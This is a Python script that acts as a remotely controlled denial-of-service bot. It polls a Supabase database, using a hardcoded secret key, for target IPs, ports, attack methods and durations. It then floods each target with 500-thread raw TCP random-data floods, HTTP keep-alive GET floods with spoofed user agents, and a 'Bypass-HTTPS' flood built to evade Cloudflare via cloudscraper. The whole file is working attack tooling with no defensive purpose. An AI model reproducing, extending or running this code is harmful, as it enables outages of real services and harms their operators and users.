import socket
import os
import random
from threading import Thread
import time
import sys

print("done ") 

try:
    import requests
    print("Done check")
except Exception as e:
    print(f"--------> Erorr {e}")
    os.system("pip3 install requests")

try:
    import cloudscraper
except:
    os.system("pip3 install cloudscraper")
    import cloudscraper

SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

def get_attack_duration():
    try:
        response = requests.get(f"{SUPABASE_URL}?select=Time&order=id.desc&limit=1", headers=HEADERS)
        if response.status_code == 200:
            data = response.json()
            if data and len(data) > 0:
                duration = data[0].get('Time', 60)
                return int(duration)
    except:
        pass
    return 60

def MyUser_Agent():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/"
    ]

# ================== BYPASS-HTTPS (CFB) METHOD ==================
def launch_bypass_https(url, threads=500):
    duration = get_attack_duration()
    end_time = time.time() + duration
    print(f"Bypass-HTTPS attack on {url} for {duration} seconds")

    def attack_thread():
        scraper = cloudscraper.create_scraper()
        while time.time() < end_time:
            try:
                scraper.get(url, timeout=10)
                scraper.get(url, timeout=10)
            except:
                pass

    threads_list = []
    for _ in range(threads):
        t = Thread(target=attack_thread)
        t.start()
        threads_list.append(t)

    time.sleep(duration)
    for t in threads_list:
        t.join()
    print(f"Bypass-HTTPS attack completed")

# ================== TCP ATTACK ==================
def tcp_attack(ip, port, threads=500, packet_size=65500):
    duration = get_attack_duration()
    end_time = time.time() + duration
    print(f"TCP Attack duration: {duration} seconds")
    
    def attack_thread():
        while time.time() < end_time:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                try:
                    sock.connect((ip, port))
                    while time.time() < end_time:
                        sock.send(random._urandom(packet_size))
                except:
                    pass
    
    for _ in range(threads):
        Thread(target=attack_thread).start()
    
    time.sleep(duration)
    print(f"TCP Attack on {ip}:{port} completed after {duration} seconds")

# ================== HTTP ATTACK ==================
def moonHttp(host_http: str, port: int):
    duration = get_attack_duration()
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
                mysocket.connect((host_http, port))
                while time.time() < end_time:
                    mysocket.send(f'GET / HTTP/1.1\r\nHost: {host_http}\r\nUser-Agent: {random.choice(MyUser_Agent())}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except Exception:
            pass

def ahmd(method: str, host_http: str, port: int):
    method_upper = method.upper()
    duration = get_attack_duration()
    
    if method_upper == "HTTP":
        print(f"Starting HTTP attack on {host_http}:{port} for {duration} seconds")
        for _ in range(500):
            thd = Thread(target=moonHttp, args=(host_http, port))
            thd.start()
        
        time.sleep(duration)
        print(f"HTTP Attack on {host_http}:{port} completed after {duration} seconds")
    
    elif method_upper == "TCP":
        print(f"Starting TCP attack on {host_http}:{port} for {duration} seconds")
        tcp_attack(host_http, port)
    
    elif method_upper == "BYPASS-HTTPS":
        print(f"Starting Bypass-HTTPS attack on {host_http} for {duration} seconds")
        launch_bypass_https(host_http)

# ================== API CHECKER ==================
def check_new_requests():
    print("Running... Now receiving only new requests")
    
    try:
        response = requests.get(
            f"{SUPABASE_URL}?select=id&order=id.desc&limit=1",
            headers=HEADERS
        )
        if response.status_code == 200:
            data = response.json()
            if data and len(data) > 0:
                last_id = data[0]['id']
                print(f"Last ID set: {last_id}. Previous data will be ignored.")
            else:
                last_id = 0
                print("No data currently.")
        else:
            last_id = 0
            print("Cannot connect to database.")
    except Exception as e:
        last_id = 0
        print(f"Error getting last ID: {e}")
    
    print("Waiting for new requests...")
    
    while True:
        try:
            response = requests.get(
                f"{SUPABASE_URL}?select=id,method,ip,port,Time&order=id.desc&limit=1",
                headers=HEADERS
            )
            if response.status_code == 200:
                data = response.json()
                if data and len(data) > 0:
                    request_data = data[0]
                    if request_data['id'] > last_id:
                        print(f"New request received! ID: {request_data['id']}")
                        last_id = request_data['id']
                        method = request_data.get('method', '')
                        ip = request_data.get('ip', '')
                        port = request_data.get('port', 80)
                        time_value = request_data.get('Time', 60)
                        
                        if ip:
                            print(f"Executing attack on: {ip}:{port} with method: {method} for {time_value} seconds")
                            ahmd(method, ip, port)
        except Exception as e:
            print(f"Error while scanning: {e}")
        
        time.sleep(2)

def main():
    check_new_requests()

if __name__ == "__main__":
    main()